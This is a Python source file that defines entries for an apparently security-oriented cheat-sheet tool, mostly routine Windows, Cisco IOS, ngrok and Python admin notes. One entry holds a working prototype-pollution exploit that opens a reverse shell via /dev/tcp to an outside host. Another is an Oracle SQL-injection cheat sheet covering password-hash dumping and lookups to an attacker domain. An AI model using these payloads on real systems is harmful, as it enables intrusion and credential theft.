open_port_to_the_net.sub_category = "Proxy"
open_port_to_the_net.output = """[*] Create a proxy with ngrok, for forwarding a port to the internet

# Need to register and get de auth_token
# Go to https://dashboard.ngrok.com/get-started/your-authtoken
# Copy the token and execute the following command

ngrok config add-authtoken xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

# Then, ngrok will work
# Example for forwarding port 80 to the internet

ngrok http 80

# You can forward ssh port 22 to the internet (you don't forward ssh, you just forward a protocol like tcp for example)

ngrok tcp 22
"""

######################################
######################################

oletools = create_new_cheat(
    "oletools - olevba - Extract VBA code from Office files - Word, Excel, PowerPoint..."
)
oletools.category = "Tools"
oletools.sub_category = "Office"
oletools.output = """[*] oletools - olevba - Extract VBA code from Office files

# Install oletools
pip install oletools

# Extract VBA code from Office files
olevba <file> | less
"""


######################################
######################################

prototipe_polution_js = create_new_cheat(
    "Javascript - NodeJS - AST Injection, Prototype Pollution to RCE"
)
prototipe_polution_js.category = "Web"
prototipe_polution_js.sub_category = "RCE"
prototipe_polution_js.output = """[*] Javascript - NodeJS - AST Injection, Prototype Pollution to RCE

# Go to https://blog.p6.is/AST-Injection/


[*] Example for Handlebars

import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})

# execute
requests.get(TARGET_URL)


[*] Example for Pug

import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})

# execute
requests.get(TARGET_URL)

"""

######################################
######################################

netstat_powerShell = create_new_cheat("netstat - PowerShell (adamtheautomator)")
netstat_powerShell.category = "Windows"
netstat_powerShell.sub_category = "PowerShell"
netstat_powerShell.output = """[*] netstat - PowerShell (adamtheautomator) - Very descritive output

Get-NetTCPConnection | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}}

# Um pouco mais filtrado...
Get-NetTCPConnection | Select-Object -Property State,Description,Name,LocalAddress,LocalPort,OwningProcess,RemoteAddress,RemotePort,PSComputerName,CimClass,CimInsta
nceProperties,CimSystemProperties,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}}

# Dá para filtrar com um Pipe também...
Get-NetTCPConnection | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | FT -Property ProcessName,LocalAddress,LocalPort,RemoteAddress,RemotePort,State,Description

Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | FT -Property ProcessName,LocalAddress,LocalPort,RemoteAddress,RemotePort,State,Description
"""


######################################
######################################

check_firewall_rules_windows = create_new_cheat(
    "Check Firewall Rule - Windows PowerShell"
)
check_firewall_rules_windows.category = "Windows"
check_firewall_rules_windows.sub_category = "PowerShell"
check_firewall_rules_windows.output = """[*] Check Firewall Rule - Windows PowerShell

powerShell -c "Get-NetFirewallRule -Direction OutBound -Action Block -Enable True"
powerShell -c "Get-NetFirewallRule -Direction OutBound -Action Allow -Enable True"

powerShell -c "Get-NetFirewallRule -Direction OutBound -Action Block -Enable True | Format-Table -Property Name, DisplayName, DisplayGroup, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}}, @{Name='LocalPort'; Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, @{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile, Direction"

"""


######################################

compile_windows = create_new_cheat("Compile Windows and exec on Linux - mingw wine")
compile_windows.category = "Linux"
compile_windows.sub_category = "Bash"
compile_windows.output = """[*] Compile Windows on Linux

# Install mingw-w64
sudo apt-get install mingw-w64

# Compile
i686-w64-mingw32-gcc -o <output>.exe <input>.c

# Run on Linux
wine <output>.exe
"""


sqloracle = create_new_cheat("SQL - Oracle - Geral comands")
sqloracle.category = "Tools"
sqloracle.sub_category = "SQL oracle"
sqloracle.output = """[*] SQL - Oracle - Geral comands


# https: //hacknopedia.com/2022/05/23/oracle-sql-injection-cheat-sheet/

SELECT TABLESPACE_NAME FROM USER_TABLESPACES;
SELECT TABLE_NAME FROM USER_TABLES;

# Gravar as alterações


# Version

SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT version FROM v$instance;


# Comments

SELECT 1 FROM dual — comment
— NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name 'dual' when we're not actually selecting from a table.

# Current User

SELECT user FROM dual

# List Users

SELECT username FROM all_users ORDER BY username;
SELECT name FROM sys.user$; — Privilege Required

# List Password Hashes

SELECT name, password, astatus FROM sys.user$ — priv, < = 10g.  a status tells you if your account is locked
SELECT name, spare4 FROM sys.user$ — Privilege Required, 11g

# List Privileges

SELECT * FROM session_privs; — current privilege
SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP'; — Privilege Required, list a user's privilege
SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY'; — Privilege Required, find users with a particular priv
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;

# List DBA Accounts

SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES'; — priv, list DBAs, DBA roles

# Current Database

SELECT global_name FROM global_name;
SELECT name FROM v$database;
SELECT instance_name FROM v$instance;
SELECT SYS.DATABASE_NAME FROM DUAL;

# List Databases

SELECT DISTINCT owner FROM all_tables; — list schemas (one per user)
— Also query TNS listener for other databases.

# List Columns

SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';

# List Tables

SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;

# Find Tables From Column Name

SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%'; — NB: table names are upper case

# Select Nth Row

SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r = 9; — gets 9th row (rows numbered from 1)


# Select Nth Char

SELECT substr('abcd', 3, 1) FROM dual; — gets 3rd character, 'c'


# Bitwise AND

SELECT bitand(6,2) FROM dual; — returns 2


# ASCII Value -> Char

SELECT chr(65) FROM dual; — returns A


# Char -> ASCII Value

SELECT ascii('A') FROM dual; — returns 65


# Casting

SELECT CAST(1 AS char) FROM dual;
SELECT CAST('1' AS int) FROM dual;

# String Concatenation

SELECT 'A' || 'B' FROM dual; — returns AB


# If Statement

BEGIN IF 1 = 1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; — doesn't play well with SELECT statements


# Case Statement

SELECT CASE WHEN 1 = 1 THEN 1 ELSE 2 END FROM dual; — returns 1
SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2

# Avoiding Quotes

SELECT chr(65) || chr(66) FROM dual; — returns AB

# Time Delay

BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can't seem to embed this in a SELECT
SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; — if reverse looks are slow
SELECT UTL_INADDR.get_host_address('blah.attacker.com') FROM dual; — if forward lookups are slow
SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual; — if outbound TCP is filtered / slow
— Also see Heavy Queries to create a time delay

# Make DNS Requests

SELECT UTL_INADDR.get_host_address('google.com') FROM dual;
SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual;

# Command Execution

Javacan be used to execute commands if it's installed.ExtProc can sometimes be used too, though it normally failed for me. 🙁

# Local File Access

UTL_FILE can sometimes be used.  Check that the following is non-null: 
SELECT value FROM v$parameter2 WHERE name = 'utl_file_dir';Java can be used to read and write files if it's installed (it is not available in Oracle Express).

# Hostname, IP Address

SELECT UTL_INADDR.get_host_name FROM dual;
SELECT host_name FROM v$instance;
SELECT UTL_INADDR.get_host_address FROM dual; — gets IP address
SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; — gets hostnames

# Location of DB files

SELECT name FROM V$DATAFILE;

# Default/System Databases

SYSTEM
SYSAUX

# Get all tablenames in one string

select rtrim(xmlagg(xmlelement(e, table_name || ',')).extract('//text()').extract('//text()') ,',') from all_tables —  when using union based SQLI with only one row

# Blind SQLi in order by clause

order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = 'a' and rownum = 1)=1) then column_name1 else column_name2 end — you must know 2 column names with the same datatype
"""


configGeralSwitch = create_new_cheat(
    "Geral Commands of Switch IOS (Internet Operative System) da Cisco"
)
configGeralSwitch.category = "IOS"
configGeralSwitch.sub_category = "Configuration"
configGeralSwitch.output = """[*] Geral Commands of Switch IOS (Internet Operative System)

# Save configs

enable
copy running-config startup-config  # Saves the running configuration to the startup configuration
copy startup-config running-config  # Loads the startup configuration into the running configuration
show running-config                 # Displays the running configuration

# Set line console password

enable
configure terminal
line console 0
password <password>
login                   # Enable login mode. This force the user to enter the password

# Set line vty password

enable
configure terminal
line vty 0 15
password <password>
login                   # Enable login mode. This force the user to enter the password

# Set password and secret for enable mode

enable
configure terminal
enable secret <password>
enable password <password>

# Encrype all passwords

enable
configure terminal
service password-encryption

# Set banner

enable
configure terminal
banner motd <message>  # This banner is displayed when the user logs in

# Set hostname

enable
configure terminal
hostname <name>

# Set Static IP

enable
configure terminal
interface Vlan 1
ip address <ip> <mask>   # where ip is like 192.168.150 and mask is like 255.255.255.0 (for example...)
no shutdown              # This command is necessary to activate the interface. If you don't use this command, the interface will be shutdown

##########
## VLAN ##
##########

# Create VLAN
configure terminal
vlan <vlan number>
name <name>
exit

# Delete a VLAN - The VLAN need to be empty
configure terminal
no vlan <vlan number>
exit

# Assign VLAN to interface
configure terminal
interface <interface>
switchport mode access
switchport access vlan <vlan number>
exit

# Remove VLAN to interface
configure terminal
interface <interface>
no switchport access vlan <vlan number>
exit

# Configure TRUNK
configure terminal
interface <interface>
switchport mode trunk
switchport trunk allowed vlan <vlan number>,<vlan number>,<vlan number>,...
switchport trunk native vlan <vlan number>        # native vlan is the vlan that is not tagged

# ROUTER-ON-A-STICK

# Create subinterface
configure terminal
interface <interface>.<subinterface>  # GibabitEthernet 0/0.10
encapsulation dot1Q <vlan number>     # encapsulation dot1Q 10
ip address <ip> <mask>                # where ip is like 172.17.10.1 255.255.255.0
exit

interface g/0/0
no shutdown
"""

allowAndDisablePing = create_new_cheat(
    "Allow and Disable Ping in Windows - Firewall - ICMP"
)
allowAndDisablePing.category = "Windows"
allowAndDisablePing.sub_category = "Firewall"
allowAndDisablePing.output = """[*] Allow and Disable Ping in Windows - Firewall - ICMP

# Allow Ping
netsh advfirewall firewall add rule name="ICMP Allow incoming V4 echo request" protocol=icmpv4:8,any dir=in action=allow
netsh advfirewall firewall add rule name="ICMP Allow incoming V6 echo request" protocol=icmpv6:128,any dir=in action=allow

# Remove new rules
netsh advfirewall firewall delete rule name="ICMP Allow incoming V4 echo request"
netsh advfirewall firewall delete rule name="ICMP Allow incoming V6 echo request"
"""

configGeralRouter = create_new_cheat(
    "Geral Commands of Router IOS (Internet Operative System) da Cisco"
)
configGeralRouter.category = "IOS"
configGeralRouter.sub_category = "Configuration"
configGeralRouter.output = """[*] Geral Commands of Router IOS (Internet Operative System)

# Verificar configurações interfaces
show ip interface brief
show ipv6 interface brief

show interfaces
show ip interface
show ipv6 interface

# Verificar roteamento
show ip route
show ipv6 route

[*] Configuring router interfaces

# Em modo enable
interface FastEthernet 0/0
description <description>
ip address <ip> <mask>       # where ip is like 192.168.150.0 and mask is like 255.255.255.0
ipv6 address <ip>/<mask>     # where ip is like 2001:db8:acad:10::1 and mask is like 64
no shutdown                  # This command is necessary to activate the interface. 
                             # If you don't use this command, the interface will be shutdown
exit

[*] Configuring NAT

interface GigabitEthernet 0/1/0                                          # Ligação ao ISP
ip nat outside

interface FastEthernet 0/1                                               # Exemplo de rede interna
ip nat inside
interface GigabitEthernet 0/2/0                                          # Exemplo de router auxiliar
ip nat inside


ip nat inside source list 1 interface GigabitEthernet 0/1/0 overload     # Rede interna <list de 1 a 99>
access-list 1 permit 192.168.1.0 0.0.0.255                               # NOTA: A máscara é invertida

ip nat inside source list 100 interface GigabitEthernet 0/2/0 overload   # router auxiliar <list de 100 a 199>
access-list 100 permit ip 192.168.100.0 0.0.0.255 any                    # NOTA: A máscara é invertida

[*] Activar Routing ipv6 (ipv4 está activo por defeito)

ipv6 unicast-routing
ip route 10.0.4.0 255.255.255.0 10.0.3.2  # ipv4
ip route 10.0.4.0 255.255.255.0 Serial0/1/1  # ipv4 (Mais rápido)
ip route <network> <mask> <next_hop ip or interface> [distance]  # ipv4

ipv6 route 2001:db8:acad:2::/64 2001:db8:acad:1::2  # ipv6
ipv6 route 2001:db8:acad:2::/64 Serial0/1/1  # ipv6 (Mais rápido)

# Default route
ip route 0.0.0.0 0.0.0.0 Serial0/1/1  # ipv4
ipv6 route ::/0 Serial0/1/1  # ipv6

# Floating static route
ip route 0.0.0.0 0.0.0.0 172.16.2.2
ip route 0.0.0.0 0.0.0.0 10.10.10.2 5  # Adiciona-se uma metrica
ipv6 route ::/0 2001:db8:acad:2::2
ipv6 route ::/0 2001:db8:feed:10::2 5  # Adiciona-se uma metrica

# Protocolo RIP
router rip
version 2
network <network>  # ipv4
passive-interface <interface>  # ipv4

default-information originate  # ipv4 NEED ip route 0.0.0.0 0.0.0.0 <interface para a internet>
"""

grepPowerShell = create_new_cheat("grep - PowerShell")
grepPowerShell.category = "Windows"
grepPowerShell.sub_category = "PowerShell"
grepPowerShell.output = """[*] grep - PowerShell

# All output in PowerShell is an object, 
# so you can convert to string first in multi line 
# with -Stream param (Out-String -Stream), then use Select-String:

Get-Alias | Out-String -Stream | Select-String -Pattern "ft"

# Fast copy:
 | Out-String -Stream | Select-String -Pattern ""
"""


disablePylintForAllFile = create_new_cheat("disable pylint for all file")
disablePylintForAllFile.category = "Python"
disablePylintForAllFile.sub_category = "general"
disablePylintForAllFile.output = """[*] disable pylint for all file

# Add this line to the top of the file:


# pylint: disable=all
"""

createNewUserPowerShell = create_new_cheat("Create new user - PowerShell")
createNewUserPowerShell.category = "Windows"
createNewUserPowerShell.sub_category = "PowerShell"
createNewUserPowerShell.output = """[*] Create new user - PowerShell

# Create new user
New-LocalUser -Name "User1" -Description "Description of User1" -NoPassword

# Add user to group
Add-LocalGroupMember -Group "Administrators" -Member "User1"

# Remove user from group
Remove-LocalGroupMember -Group "Administrators" -Member "User1"

# Delete user
Remove-LocalUser -Name "User1"

# Change password
Set-LocalUser -Name "User1" -Password (ConvertTo-SecureString -AsPlainText "NewPassword" -Force)

$Password = Read-Host -AsSecureString
Set-LocalUser -Name "User1" -Password $Password -Description "New description"
"""
